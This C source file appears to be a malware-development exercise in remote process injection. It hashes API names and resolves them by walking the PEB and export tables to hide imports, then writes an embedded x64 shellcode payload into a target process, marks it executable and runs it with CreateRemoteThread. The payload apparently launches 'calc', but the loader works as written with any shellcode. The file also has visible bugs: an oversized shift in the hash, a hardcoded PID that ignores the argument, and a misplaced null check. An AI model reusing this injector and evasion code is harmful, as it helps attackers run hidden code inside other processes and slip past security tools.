#include "header.h"

/// HASHING
//////////////////////////////////////////////////////////////////////////////////////////////
#define INITIAL_SEED 2834

// Create macros for using hashing algorithms faster and easier
#define HASHA(STRING) (HashJenkinsOneAtATime32BitA((PCHAR)STRING))
#define HASHW(STRING) (HashJenkinsOneAtATime32BitW((PWCHAR)STRING))

UINT32 HashJenkinsOneAtATime32BitA(IN PCHAR string) {

    SIZE_T sIndex = 0;
    UINT32 uHash = 0;
    SIZE_T sLength = lstrlenA(string);

    while (sIndex != sLength)
    {
        uHash += string[sIndex++];
        uHash += uHash << INITIAL_SEED;
        uHash ^= uHash >> 6;
    }

    uHash += uHash << 3;
    uHash ^= uHash >> 11;
    uHash += uHash << 15;

    return uHash;
}

UINT32 HashJenkinsOneAtATime32BitW(IN PWCHAR string) {

    SIZE_T sIndex = 0;
    UINT32 uHash = 0;
    SIZE_T sLength = lstrlenW(string);

    while (sIndex != sLength)
    {
        uHash += string[sIndex++];
        uHash += uHash << INITIAL_SEED;
        uHash ^= uHash >> 6;
    }

    uHash += uHash << 3;
    uHash ^= uHash >> 11;
    uHash += uHash << 15;

    return uHash;
}
//////////////////////////////////////////////////////////////////////////////////////////////

/// API Hashes
#define kernel32dll_HASH		    0x9993E9C0
#define OpenProcess_HASH		    0x29DBF121
#define VirtualAllocEx_HASH         0xF2070038
#define WriteProcessMemory_HASH     0xF5A08B93
#define VirtualProtectEx_HASH       0x21EDDB85
#define CreateRemoteThread_HASH     0xB8F51715
#define WaitForSingleObject_Hash    0xDA34F125

/// Custom GetProcAddress 
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD dwApiNameHash) {

    if (!hModule || !dwApiNameHash) return NULL; 

    PBYTE pBase = (PBYTE)hModule;

    // Get DOS Header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    // Get NT Headers
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Get Optional Header
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdr->OptionalHeader;
    if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return NULL;
    }
        
    // Get pointer to the Export Table structure
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get relevant information from the export directory to search for a specific function
    PDWORD FnNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);			// function names
    PDWORD FnAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);  // function addresses
    PWORD FnOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // function ordinals

    // Loop over exported functions 
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        // Get name of the function 
        CHAR* pFnName = (CHAR*)(pBase + FnNameArray[i]); // Name
        WORD wFnOrdinal = FnOrdinalArray[i]; // Ordinal
        PVOID pFnAddress = (PVOID)(pBase + FnAddressArray[wFnOrdinal]); // Address

        // Search for the function that matches the hash and return it
        if (HASHA(pFnName) == dwApiNameHash) {
//#ifdef _DEBUG
//			OKAY("[ 0x%p ] Found function \"%s\"", pFnAddress, pFnName);
//#endif
            return pFnAddress;
        }
    }

    WARN("Function for hash 0x%X not found.", dwApiNameHash);
    return NULL;
}

/// Custom GetModuleHandle
HMODULE GetModuleHandleH(IN DWORD dwModuleNameHash) {

    if (!dwModuleNameHash) return NULL; 

    PPEB pPeb = NULL;

    // Use to __readgsqword macro to get the address of the PPEB by specifying the offset of 0x60 (0x30 on 32-bit systems, since PVOID has a since of 4 on there.
#ifdef _WIN64
    pPeb = __readgsqword(0x60); // sizeof(PVOID) = 8 --[ * 12 ]--> 96 --[ HEX ]--> 0x60
#elif _WIN32
    pPeb = __readgsqword(0x30); // sizeof(PVOID) = 4 --> [ * 12 ] = 48 --[ HEX ]-- 0x30
#endif 

    // Get PED_LDR_DATA structure
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    // Get first element of the linked list which contains information about the first module
    // Doubly-linked lists use the Flink and Blink elements as the head and tail pointers, respectively. 
    // This means Flink points to the next node in the list whereas the Blink element points to the previous node in the list. 
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Loop over all modules
    while (pDte) {

        if (pDte->FullDllName.Length == NULL || pDte->FullDllName.Length > MAX_PATH) {
            break;
        }

        // Convert FullDllName.Buffer to lowercase string
        CHAR szLowercaseDllName[MAX_PATH]; 

        DWORD i = 0;
        for (i = 0; i < pDte->FullDllName.Length; i++) {
            szLowercaseDllName[i] = (CHAR)tolower(pDte->FullDllName.Buffer[i]); 
        }
        szLowercaseDllName[i] = '\0'; 
        
        // Check if hashes match
        if (HASHA(szLowercaseDllName) == dwModuleNameHash) {
            // The DLL base address is InInitializationOrderLinks.Flink, or Reserved2[0]
            // If the undocumented structs are not present, the next line could also be written as the following
            // return (HMODULE)(pDte->Reserved2[0]
            HANDLE hModule = (HMODULE)pDte->InInitializationOrderLinks.Flink;

//#ifdef _DEBUG
//			OKAY_W(L"[ 0x%p ] Found module \"%s\"", hModule, pDte->FullDllName.Buffer);
//#endif

            return hModule; 
        }

        // Move to the next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}

/// <summary>
///  Injects shellcode into remote process
/// </summary>
/// <param name="hProcess"> Handle to remote process </param>
/// <param name="pShellcode"> Payload </param>
/// <param name="sSize"> Size of the payload </param>
/// <param name="ppAddress"> OUT: Address of the allocated memory </param>
BOOL InjectIntoRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize, OUT PBYTE* ppAddress) {

    PVOID pAddress = NULL;
    SIZE_T sBytesWritten = NULL; 
    DWORD dwOldProtection = NULL; 

    /// Getting addresses to API functions 
    fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), VirtualAllocEx_HASH);
    if (!pVirtualAllocEx) {
        PRINT_ERROR("GetProcAddressH");
        return FALSE;
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to VirtualAllocEx", pVirtualAllocEx);
//#endif

    fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), WriteProcessMemory_HASH);
    if (!pWriteProcessMemory) {
        PRINT_ERROR("GetProcAddressH");
        return FALSE; 
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to WriteProcessMemory", pWriteProcessMemory);
//#endif

    fnVirtualProtectEx pVirtualProtectEx = (fnVirtualProtectEx)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), VirtualProtectEx_HASH);
    if (!pVirtualProtectEx) {
        PRINT_ERROR("GetProcAddressH");
        return FALSE;
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to VirtualProtectEx", pVirtualProtectEx);
//#endif

    /// Perform injection
    pAddress = pVirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
    if (!pAddress) {
        PRINT_ERROR("pVirtualAllocEx"); 
        return FALSE;
    }

    if (!pWriteProcessMemory(hProcess, pAddress, pShellcode, sSize, &sBytesWritten)) {
        PRINT_ERROR("pWriteProcessMemory"); 
        return FALSE; 
    }

    if (!pVirtualProtectEx(hProcess, pAddress, sSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        PRINT_ERROR("pVirtualProtectEx");
        return FALSE;  
    }

    // Store pointer to payload
    *ppAddress = pAddress; 

    if (!*ppAddress) return FALSE; 

    return TRUE; 
}

int main(int argc, char* argv[]) {

    unsigned char pShellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
        };

    HANDLE hProcess = NULL; 
    HANDLE hThread = NULL; 
    DWORD dwThreadId = NULL; 
    PBYTE pAddress = NULL; 
 
    if (argc < 2) {
        WARN("Usage: %s [PID]", argv[0]); 
        return EXIT_FAILURE; 
    }

    /// Getting addresses to API functions 
    fnOpenProcess pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), OpenProcess_HASH);
    if (!pOpenProcess) {
        PRINT_ERROR("GetProcAddressH"); 
        return EXIT_FAILURE; 
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to OpenProcess", pOpenProcess); 
//#endif

    fnCreateRemoteThread pCreateRemoteThread = (fnCreateRemoteThread)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), CreateRemoteThread_HASH); 
    if (!pCreateRemoteThread) {
        PRINT_ERROR("GetProcAddressH");
        return EXIT_FAILURE;
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to CreateRemoteThread", pCreateRemoteThread);
//#endif

    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32dll_HASH), WaitForSingleObject_Hash);
    if (!pCreateRemoteThread) {
        PRINT_ERROR("GetProcAddressH");
        return EXIT_FAILURE;
    }
//#ifdef _DEBUG
//	OKAY("[ 0x%p ] Got address to WaitForSingleObject", pWaitForSingleObject);
//#endif

    // Get handle to process
    hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, 8124);
    if (!hProcess) {
        PRINT_ERROR("pOpenProcess"); 
        return EXIT_FAILURE; 
    }
    OKAY("[ 0x%p ] Target process found.", hProcess); 

    // Inject shellcode into process
    if (!InjectIntoRemoteProcess(hProcess, pShellcode, sizeof(pShellcode), &pAddress)) {
        PRINT_ERROR("InjectIntoRemoteProcess"); 
        return EXIT_FAILURE; 
    }
    OKAY("[ 0x%p ] Payload injected.", pAddress);  

    // Create thread
    hThread = pCreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, &dwThreadId); 
    if (!hThread) {
        PRINT_ERROR("pCreateRemoteThread");
        return EXIT_FAILURE; 
    }
    OKAY("[ %d ] Thread created.", dwThreadId); 

    pWaitForSingleObject(hThread, INFINITE); 

    return EXIT_SUCCESS; 
}